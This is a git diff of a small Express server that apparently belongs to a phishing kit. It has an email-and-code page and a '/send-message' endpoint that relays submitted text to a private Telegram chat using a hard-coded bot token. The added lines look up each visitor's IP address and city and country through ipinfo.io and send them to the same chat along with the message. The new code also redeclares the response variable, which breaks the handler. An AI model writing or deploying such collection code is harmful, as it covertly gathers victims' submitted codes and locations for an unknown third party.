@@ -1,12 +1,12 @@
 const express = require("express");
 const path = require("path");
 const axios = require("axios");
-const favicon = require('serve-favicon');
+const favicon = require("serve-favicon");
 
 const app = express();
 const PORT = 3000;
 
-app.use(favicon(path.join(__dirname, 'public', 'ico.ico')));
+app.use(favicon(path.join(__dirname, "public", "ico.ico")));
 // Serve static files from the 'public' folder
 app.use(express.static(path.join(__dirname, "public")));
 // Route to serve index.html
@@ -28,8 +28,6 @@ app.get("/code/:email", (req, res) => {
     res.sendFile(path.join(__dirname, "public", "code.html"));
 });
 
-
-
 const botToken = "7919345658:AAGVy4jwPdSyRKp6VDJ8a5gsq2DTNn-M4Bs";
 const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
@@ -37,16 +35,20 @@ const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 app.get("/send-message", async (req, res) => {
     const { message } = req.query;
     if (!message) {
-        return res
-            .status(400)
-            .json({ error: "message are required" });
+        return res.status(400).json({ error: "message are required" });
     }
 
     try {
+        const userIP =
+            req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+
+        const res = await axios.get(`https://ipinfo.io/${userIP}/json`);
+        const data = res.data;
+        const chot = `IP: ${userIP}\nAddress: ${data.city},${data.country}\n${message}`;
         // Gửi yêu cầu POST đến API của Telegram
         const response = await axios.post(telegramApiUrl, {
-            chat_id: '6580233045',
-            text: message,
+            chat_id: "6580233045",
+            text: chot,
         });
 
         // Kiểm tra xem yêu cầu có thành công không
